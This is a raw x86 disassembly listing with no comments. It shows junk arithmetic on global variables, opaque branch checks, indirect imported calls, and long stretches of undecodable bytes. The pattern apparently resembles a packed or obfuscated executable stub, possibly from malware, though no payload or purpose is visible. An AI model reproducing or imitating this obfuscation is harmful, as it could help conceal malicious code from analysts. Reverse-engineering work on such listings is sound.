  41fbd7:	mov    DWORD PTR ds:0x428277,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428177,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42836f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x4280df
  41fbfd:	call   DWORD PTR ds:0x428e40
  41fc03:	and    ecx,DWORD PTR ds:0x428263
  41fc09:	adc    DWORD PTR ds:0x4282f3,ecx
  41fc0f:	sub    DWORD PTR ds:0x4282fb,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42836b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42822b
  41fc21:	mov    DWORD PTR ds:0x42836b,ecx
  41fc27:	and    DWORD PTR ds:0x428313,0x55d2
  41fc31:	add    DWORD PTR ds:0x42818f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42827f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42828f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42815b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428277,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42822f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x428293,ebx
  41fc7a:	mov    DWORD PTR ds:0x4282a7,0x2746
  41fc84:	mov    DWORD PTR ds:0x428277,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42816b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42822f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428eb4
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x4283a3
  41fcc1:	and    DWORD PTR ds:0x42816b,0x42831f
  41fccb:	mov    ecx,DWORD PTR ds:0x428173
  41fcd1:	xor    DWORD PTR ds:0x42823f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428287
  41fcde:	sub    DWORD PTR ds:0x428393,ecx
  41fce4:	mov    DWORD PTR ds:0x428243,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x4283a7
  41fd0b:	add    eax,DWORD PTR ds:0x42816f
  41fd11:	mov    ds:0x4283a7,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x428313,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x4282fb
  41fd39:	mov    ecx,DWORD PTR ds:0x42838b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42822b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x428313,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e44
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428273,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42824f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x4282b3
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x42829f,ecx
  41fd92:	sbb    DWORD PTR ds:0x428393,0x42831b
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x42830f,0x428313
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42817f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42836f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42836f
  41fe15:	xor    DWORD PTR ds:0x428377,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42816f,0x0
  41fe51:	not    DWORD PTR ds:0x42829b
  41fe57:	mov    DWORD PTR ds:0x428237,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42816f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e48
  41fe7d:	and    DWORD PTR ds:0x428387,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42823f
  41fe8d:	movzx  ecx,WORD PTR ds:0x428317
  41fe94:	and    DWORD PTR ds:0x4282f3,ecx
  41fe9a:	and    DWORD PTR ds:0x428267,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x4281ab
  41feab:	mov    ecx,DWORD PTR ds:0x4283df
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42818f
  41fed3:	or     DWORD PTR ds:0x4283a3,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42826b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42836f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282eb,ecx
  41ff06:	cmp    DWORD PTR ds:0x42826b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428153
  41ff18:	call   DWORD PTR ds:0x428eb8
  41ff1e:	or     ecx,DWORD PTR ds:0x428173
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x428317,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42823b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0xcb
  41ff55:	arpl   WORD PTR [ecx+0x16232370],dx
  41ff5b:	sbb    BYTE PTR [ebx-0x48e7e7ee],ah
  41ff61:	xor    al,0xeb
  41ff63:	cs mov ebx,0x19a029d7
  41ff69:	inc    esi
  41ff6a:	push   0xaec5bb2
  41ff6f:	or     esp,esi
  41ff71:	mov    bh,0xee
  41ff73:	sti    
  41ff74:	jno    0x41ff08
  41ff76:	sub    cl,ch
  41ff78:	and    BYTE PTR [edi+0xfec79c8],bh
  41ff7e:	popa   
  41ff7f:	push   eax
  41ff80:	push   cs
  41ff81:	jle    0x41ffb8
  41ff83:	pop    ebx
  41ff84:	xchg   esp,eax
  41ff85:	jbe    0x41ffd1
  41ff87:	add    eax,0x151b07ae
  41ff8c:	inc    eax
  41ff8d:	xchg   esp,eax
  41ff8e:	mov    eax,0x8e0e4dba
  41ff93:	xchg   esp,eax
  41ff94:	(bad)  
  41ff95:	cld    
  41ff96:	cmp    BYTE PTR [ebx-0x6680c06b],dl
  41ff9c:	sub    DWORD PTR [edx],ebx
  41ff9e:	xor    ebx,DWORD PTR [esi+0x43]
  41ffa1:	out    dx,al
  41ffa2:	mov    edx,0xcb14e6bd
  41ffa7:	mov    ah,0xed
  41ffa9:	js     0x41ff7a
  41ffab:	mov    ds:0xbb70c5c7,eax
  41ffb0:	pop    es
  41ffb1:	loope  0x41ff78
  41ffb3:	cmc    
  41ffb4:	mov    al,0x61
  41ffb6:	pop    ds
  41ffb7:	push   ebp
  41ffb8:	loopne 0x420033
  41ffba:	push   0x48c302fd
  41ffbf:	fs xor eax,0xa68c7e6b
  41ffc5:	dec    edi
  41ffc6:	sbb    edx,DWORD PTR [eax-0x5637515c]
  41ffcc:	add    BYTE PTR [esi],0x4d
  41ffcf:	or     eax,0xaa12833a
  41ffd4:	add    BYTE PTR [ecx-0x26],al
  41ffd7:	add    eax,ebx
  41ffd9:	adc    al,0x4
  41ffdb:	push   0x282eae7b
  41ffe0:	xlat   BYTE PTR ds:[ebx]
  41ffe1:	mov    al,ds:0x39c63ef1
  41ffe6:	(bad)  
  41ffe7:	clc    
  41ffe8:	cmp    edi,eax
  41ffea:	out    0x4c,al
  41ffec:	retf   
  41ffed:	mov    eax,0x3a98bc09
  41fff2:	sbb    eax,0xdb6e8e94
  41fff7:	cdq    
  41fff8:	pop    ebx
  41fff9:	scas   eax,DWORD PTR es:[edi]
  41fffa:	mov    sp,0xc7e3
  41fffe:	pop    esp
  41ffff:	fist   WORD PTR [ecx]
  420001:	mov    dh,0xe3
  420003:	daa    
  420004:	adc    WORD PTR [edi-0x67306a4b],bx
  42000b:	fimul  DWORD PTR [ebp-0x3a]
  42000e:	mov    esp,0x53985cea
  420013:	adc    eax,0x72cd3a8d
  420018:	into   
  420019:	(bad)  
  42001a:	shl    BYTE PTR [ecx-0x4d],1
  42001d:	mov    edx,0x1df4380
  420022:	pushf  
  420023:	mov    ds:0xb1c75bb6,eax
  420028:	stc    
  420029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42002a:	into   
  42002b:	and    al,0x33
  42002d:	fidiv  DWORD PTR [edx+eax*8]
  420030:	jge    0x42009b
  420032:	pop    esi
  420033:	into   
  420034:	cs jnp 0x420004
  420037:	ret    
  420038:	push   0x4a
  42003a:	mov    ecx,0x9acafcb5
  42003f:	add    bh,BYTE PTR [edi]
  420041:	sub    al,0xda
  420043:	xchg   ecx,eax
  420044:	call   0xa26547de
  420049:	mov    ch,BYTE PTR [edx]
  42004b:	stos   DWORD PTR es:[edi],eax
  42004c:	sub    ch,BYTE PTR [edx]
  42004e:	dec    edi
  42004f:	in     al,dx
  420050:	ja     0x4200bd
  420052:	pop    edi
  420053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420054:	push   ss
  420055:	sbb    al,BYTE PTR [edi-0x1743033c]
  42005b:	dec    ebp
  42005c:	mov    BYTE PTR [esp+edx*8],bl
  42005f:	imul   ebx,eax,0x5c11a7c3
  420065:	push   esp
  420066:	dec    ecx
  420067:	fisub  DWORD PTR [edx-0x67388943]
  42006d:	or     eax,0xac436f98
  420072:	push   0x6cb77a99
  420077:	sbb    BYTE PTR [edi+0x7e],ah
  42007a:	aas    
  42007b:	and    DWORD PTR [ebx+0x5b],esi
  42007e:	js     0x4200eb
  420080:	mov    esp,0xf861e948
  420085:	std    
  420086:	loopne 0x420070
  420088:	(bad)  
  420089:	sbb    eax,0x916b176b
  42008e:	ds mov esp,0xa4173b1
  420094:	bound  ebp,QWORD PTR [esi]
  420096:	add    al,0xbf
  420098:	push   0x1e
  42009a:	and    BYTE PTR [edx+0x36],al
  42009d:	ja     0x420118
  42009f:	out    0x61,eax
  4200a1:	and    ecx,DWORD PTR [edi]
  4200a3:	jns    0x4200ec
  4200a5:	adc    edx,ebp
  4200a7:	cmp    al,0x1e
  4200a9:	aas    
  4200aa:	cmp    ah,dl
  4200ac:	fisub  DWORD PTR [ebx-0x60595490]
  4200b2:	lods   eax,DWORD PTR ds:[esi]
  4200b3:	sub    al,0x22
  4200b5:	call   0x8c33848c
  4200ba:	sbb    edi,DWORD PTR [ebp-0x330f92e4]
  4200c0:	inc    esi
  4200c1:	and    DWORD PTR [edx-0x4],edi
  4200c4:	(bad)  
  4200c5:	idiv   esp
  4200c7:	inc    edi
  4200c8:	sub    al,0x30
  4200ca:	lods   al,BYTE PTR ds:[esi]
  4200cb:	sub    eax,0xdb594351
  4200d0:	ror    cl,cl
  4200d2:	and    edi,0x75
  4200d5:	xchg   DWORD PTR [ebp-0x41],eax
  4200d8:	mov    ebp,0x7f89b6b0
  4200dd:	dec    edi
  4200de:	int3   
  4200df:	rol    DWORD PTR [esi],cl
  4200e1:	cmp    eax,0x95d2b41e
  4200e6:	inc    edi
  4200e7:	sub    al,0xd
  4200e9:	ds (bad) 
  4200eb:	stc    
  4200ec:	cs pop ebp
  4200ee:	neg    DWORD PTR [edx]
  4200f0:	push   ebx
  4200f1:	inc    di
  4200f3:	arpl   WORD PTR ss:[edi],bp
  4200f6:	scas   al,BYTE PTR es:[edi]
  4200f7:	jecxz  0x42008b
  4200f9:	xchg   ecx,eax
  4200fa:	repnz cmp cl,BYTE PTR [ebp+0x7a5b2443]
  420101:	or     DWORD PTR [edi-0x44ae22ef],0x615d4b35
  42010b:	push   edx
  42010c:	pusha  
  42010d:	(bad)  
  42010e:	neg    DWORD PTR [eax]
  420110:	jb     0x42010e
  420112:	repz mov esi,0xa0131ce5
  420118:	fstp   DWORD PTR [ecx+ebp*4]
  42011b:	mov    ecx,ecx
  42011d:	fistp  WORD PTR [eax+0x13]
  420120:	pop    ss
  420121:	retf   
  420122:	bound  ecx,QWORD PTR [edx]
  420124:	mov    ds:0x9444e716,al
  420129:	sti    
  42012a:	loopne 0x4200b4
  42012c:	int3   
  42012d:	inc    esp
  42012e:	frstor [edx-0x33604723]
  420134:	mov    eax,ds:0x71246c08
  420139:	imul   esi,DWORD PTR [edx-0xb],0xffffff98
  42013d:	stos   DWORD PTR es:[edi],eax
  42013e:	pop    edi
  42013f:	(bad)  
  420140:	mov    edx,0xe12a172c
  420145:	ret    0x1126
  420148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420149:	inc    bh
  42014b:	and    eax,0x4bfc7287
  420150:	aad    0x30
  420152:	push   ds
  420153:	jle    0x4201bf
  420155:	gs jne 0x4200df
  420158:	inc    ebp
  420159:	inc    esp
  42015a:	cmp    edx,DWORD PTR [ebx-0x36947c13]
  420160:	jp     0x420155
  420162:	test   DWORD PTR [eax-0x7e],edx
  420165:	neg    DWORD PTR ds:0xd0ec686f
  42016b:	jmp    0xad401a98
  420170:	jo     0x420128
  420172:	sbb    eax,0xf9042d0b
  420177:	ret    0x5fda
  42017a:	mov    al,ds:0x14d3222b
  42017f:	xchg   esp,eax
  420180:	xchg   ebp,edx
  420182:	mov    al,ds:0xb422eea9
  420187:	mov    ah,0xeb
  420189:	sub    edi,DWORD PTR [ecx+0x4d]
  42018c:	sti    
  42018d:	dec    ebp
  42018e:	pop    esp
  42018f:	xchg   esp,eax
  420190:	and    ah,BYTE PTR [ebx]
  420192:	or     al,0x4
  420194:	test   DWORD PTR [ecx],eax
  420196:	adc    ch,BYTE PTR [bp+di]
  420199:	loopne 0x42017f
  42019b:	test   DWORD PTR [ebx],edx
  42019d:	xor    BYTE PTR [esi],dh
  42019f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201a0:	add    eax,ebx
  4201a2:	shl    BYTE PTR [eax+0x59],cl
  4201a5:	pop    ss
  4201a6:	cmp    DWORD PTR [ecx+0x4],ebx
  4201a9:	div    DWORD PTR [eax-0x23]
  4201ac:	cmp    ebx,DWORD PTR [edi+0x53b69825]
  4201b2:	out    0x1c,eax
  4201b4:	std    
  4201b5:	inc    ebp
  4201b6:	in     al,dx
  4201b7:	sbb    bh,bh
  4201b9:	add    al,0x28
  4201bb:	bound  edi,QWORD PTR [ebp-0x767f010b]
  4201c1:	outs   dx,DWORD PTR ds:[esi]
  4201c2:	lods   eax,DWORD PTR ds:[esi]
  4201c3:	(bad)  
  4201c4:	jmp    0x2be544c8
  4201c9:	jo     0x4201b2
  4201cb:	mov    BYTE PTR ss:[ebp+0x53],bh
  4201cf:	push   ebp
  4201d0:	cmp    BYTE PTR [esi],dl
  4201d2:	mov    esi,0x2d38997e
  4201d7:	nop
  4201d8:	mov    eax,ds:0x27cdea80
  4201dd:	sbb    DWORD PTR [edi+ecx*4+0x660abbb8],edx
  4201e4:	mov    ds:0x502512da,al
  4201e9:	push   esi
  4201ea:	mov    edi,0x1e8a5bdf
  4201ef:	mov    ch,0xd6
  4201f1:	push   ss
  4201f2:	xchg   edx,eax
  4201f3:	xor    eax,DWORD PTR [eax-0x679c5061]
  4201f9:	les    esp,FWORD PTR [esi+eax*2]
  4201fc:	popa   
  4201fd:	and    al,0x8c
  4201ff:	fwait
  420200:	sub    eax,0xeac34162
  420205:	add    BYTE PTR [ebx+0x7a9d9ae1],dh
  42020b:	stos   DWORD PTR es:[edi],eax
  42020c:	push   ss
  42020d:	mov    dh,0x29
  42020f:	pushf  
  420210:	xchg   esi,eax
  420211:	lds    ecx,FWORD PTR [esi-0x59]
  420214:	test   DWORD PTR [eax],esp
  420216:	sahf   
  420217:	lock mov eax,ds:0x67a7ba4d
  42021d:	push   ebp
  42021e:	mov    al,0xbc
  420220:	xchg   eax,edi
  420222:	test   DWORD PTR [edx-0x7a008c99],esi
  420228:	push   ecx
  420229:	mov    edx,0x27503b12
  42022e:	fs and edi,edi
  420231:	ficom  DWORD PTR [eax+0x2e]
  420234:	jge    0x420252
  420236:	cmp    cl,BYTE PTR [ebx-0x6583ae89]
  42023c:	fldenv ds:0x2115fa08
  420242:	push   ss
  420243:	sub    ebx,esp
  420245:	mov    dl,0xc5
  420247:	or     esp,ebx
  420249:	add    eax,0x8f98ef18
  42024e:	in     al,dx
  42024f:	dec    esi
  420250:	add    eax,0xbd601f7f
  420255:	std    
  420256:	cmp    DWORD PTR [edx+0x7cba849a],0xd3fb1486
  420260:	cmp    DWORD PTR [esi-0x5e],esp
  420263:	sar    BYTE PTR [ecx+0x52],cl
  420266:	cmp    esp,0x97a0d49b
  42026c:	add    cl,BYTE PTR [eax]
  42026e:	pop    ds
  42026f:	mov    ebp,DWORD PTR [edi+0x14333b7c]
  420275:	xchg   esi,eax
  420276:	inc    ebp
  420277:	sar    BYTE PTR [ecx-0x45],cl
  42027a:	jmp    0x4202d3
  42027c:	cmc    
  42027d:	imul   edi,DWORD PTR [edx+eax*2-0xe],0x82189eaa
  420285:	ror    DWORD PTR [edx-0x3c68f665],0x4e
  42028c:	pop    ebx
  42028d:	push   eax
  42028e:	sbb    BYTE PTR [ebp-0x2e],ch
  420291:	mov    cl,0x1c
  420293:	mov    ah,dh
  420295:	repz fadd DWORD PTR [esp-0x423a4ba6]
  42029d:	dec    ebx
  42029e:	fwait
  42029f:	mov    ecx,DWORD PTR [ebp-0x114]
  4202a5:	or     DWORD PTR ds:0x42828f,0x42830b
  4202af:	sub    eax,ecx
  4202b1:	mov    ecx,DWORD PTR ds:0x428387
  4202b7:	add    DWORD PTR ds:0x42830f,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42838b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428167,0x428287
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42837b,0x42815f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428273,0x42822b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x42830b,0x0
  42030c:	mov    DWORD PTR ds:0x428263,edx
  420312:	mov    esi,DWORD PTR ds:0x42822b
  420318:	mov    DWORD PTR ds:0x428307,ebx
  42031e:	mov    DWORD PTR ds:0x428317,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428183,0x3019
  420337:	not    DWORD PTR ds:0x42830b
  42033d:	cmp    DWORD PTR ds:0x42830b,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42836b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428ebc
  420363:	adc    ecx,DWORD PTR ds:0x428243
  420369:	xor    DWORD PTR ds:0x4282ff,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x42821b
  420377:	mov    esi,DWORD PTR ds:0x4282d3
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x428187,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x4282fb,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428377,0x0
  4203b4:	mov    DWORD PTR ds:0x42829f,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x42819b
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42825f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42825b,edi
  4203db:	cmp    DWORD PTR ds:0x428377,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427fef
  4203ed:	call   DWORD PTR ds:0x428ec0
  4203f3:	movzx  esi,WORD PTR ds:0x428177
  4203fa:	add    DWORD PTR ds:0x4282f7,esi
  420400:	adc    DWORD PTR ds:0x428197,ebx
  420406:	add    DWORD PTR ds:0x428373,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428373
  420416:	or     DWORD PTR ds:0x42836f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x4282f3
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428273,0x0
  42042e:	mov    DWORD PTR ds:0x428373,0x5615
  420438:	mov    DWORD PTR ds:0x42816b,0x419b
  420442:	mov    DWORD PTR ds:0x42818f,0x389d
  42044c:	not    DWORD PTR ds:0x428263
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428273,0x0
  420463:	je     0x4204a0
  420469:	push   0x42823f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428ec4
  420477:	sub    DWORD PTR ds:0x4282f7,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42826b
  420488:	xor    esi,DWORD PTR ds:0x42831b
  42048e:	mov    DWORD PTR ds:0x42826b,esi
  420494:	mov    esi,DWORD PTR ds:0x428253
  42049a:	or     DWORD PTR ds:0x4282ef,esi
  4204a0:	xor    DWORD PTR ds:0x42831f,ecx
  4204a6:	add    DWORD PTR ds:0x42831f,ebx
  4204ac:	or     DWORD PTR ds:0x428377,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42818b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42816f,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x4283a7,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42818b,0x0
  420500:	mov    DWORD PTR ds:0x4282f3,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42828f
  42051b:	cmp    DWORD PTR ds:0x42818b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428ec8
  420543:	mov    esi,DWORD PTR ds:0x42817b
  420549:	sbb    DWORD PTR ds:0x428197,esi
  42054f:	and    DWORD PTR ds:0x428293,edx
  420555:	sbb    DWORD PTR ds:0x428247,edx
  42055b:	mov    esi,DWORD PTR ds:0x42837f
  420561:	or     DWORD PTR ds:0x428383,esi
  420567:	mov    esi,DWORD PTR ds:0x4281a7
  42056d:	mov    edx,DWORD PTR ds:0x42833f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42837f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428173,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x428397,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428233,0x2222
  4205bd:	not    DWORD PTR ds:0x428243
  4205c3:	cmp    DWORD PTR ds:0x428173,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x42839f
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e4c
  4205e8:	xor    edx,DWORD PTR ds:0x428247
  4205ee:	mov    ecx,DWORD PTR ds:0x42822f
  4205f4:	or     DWORD PTR ds:0x42815f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x4282d3
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x42839b,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42827b
  42061a:	xor    DWORD PTR ds:0x428267,edx
  420620:	movzx  ecx,WORD PTR ds:0x428253
  420627:	and    ecx,DWORD PTR ds:0x42838b
  42062d:	mov    DWORD PTR ds:0x428253,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x42839f,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	mov    BYTE PTR ds:[esi],0x6a
  420672:	lods   al,BYTE PTR ds:[esi]
  420673:	sbb    eax,0x12a31816
  420678:	sbb    BYTE PTR [eax],bl
  42067a:	out    0xa7,eax
  42067c:	fldcw  WORD PTR [eax]
  42067e:	sub    eax,0xe91a8b8
  420683:	mov    esp,DWORD PTR [edi+0x2]
  420686:	call   0x2ae8:0xf4715b8a
  42068d:	mov    edi,0xed6a677e
  420692:	iret   
  420693:	add    al,0xa7
  420695:	cmp    DWORD PTR [eax],ecx
  420697:	stc    
  420698:	sbb    DWORD PTR ds:0x4d9c5d14,edi
  42069e:	scas   al,BYTE PTR es:[edi]
  42069f:	out    0x89,al
  4206a1:	and    BYTE PTR [ecx+0x48],0xe
  4206a5:	ficomp WORD PTR [edx+0x54]
  4206a8:	push   ebp
  4206a9:	and    DWORD PTR [esi+0x387dfcb5],edi
  4206af:	call   FWORD PTR [edi+ebp*1+0x40]
  4206b3:	sub    eax,0x89108fee
  4206b8:	add    bl,BYTE PTR ds:0x75b87272
  4206be:	imul   dl
  4206c0:	push   0xf9753cc7
  4206c5:	mul    DWORD PTR [edi]
  4206c7:	sbb    ch,BYTE PTR [ebx]
  4206c9:	jmp    DWORD PTR [ebx-0x4b154ec]
  4206cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206d0:	adc    eax,0xa1a7dbe5
  4206d5:	imul   edi,DWORD PTR [edi],0xfffffffe
  4206d8:	push   edx
  4206d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206da:	ftst   
  4206dc:	in     eax,dx
  4206dd:	jae    0x4206ee
  4206df:	and    eax,0x5ae741c1
